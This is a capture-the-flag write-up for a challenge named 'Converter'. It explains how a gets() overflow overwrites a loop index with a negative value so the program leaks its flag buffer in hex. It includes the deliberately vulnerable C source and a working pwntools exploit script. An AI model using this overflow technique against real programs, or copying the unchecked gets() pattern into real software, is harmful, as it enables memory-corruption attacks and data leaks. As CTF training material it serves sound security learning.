# Converter

Looking at source code, we see that we can overflow the name buffer and change the value of `i` variable to a negative value which results in the flag buffer being printed as hex in the loop as it only checks if `i < 16` and not if `i >= 0`. Using gdb is necessary here to see where the variable and buffers are located in memory. The flag is printed in hex so we need to convert it back to ascii.

### Source code
```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (i < 16)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));
        i++;
    }
    printf("\n");
}
```

### Solution script
```python
from pwn import *
context.arch = "amd64"

io = process("./chal")
# io = remote("amt.rs", 31630)

if args.GDB:
	gdbscript="""
	b *main+172
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

payload = b"A"*28
payload += p32(-64, signed=True)

io.sendlineafter(b"hex:", payload)

io.recvline()
data = io.recvline()
info(f"flag is {unhex(data)}")
io.interactive()
```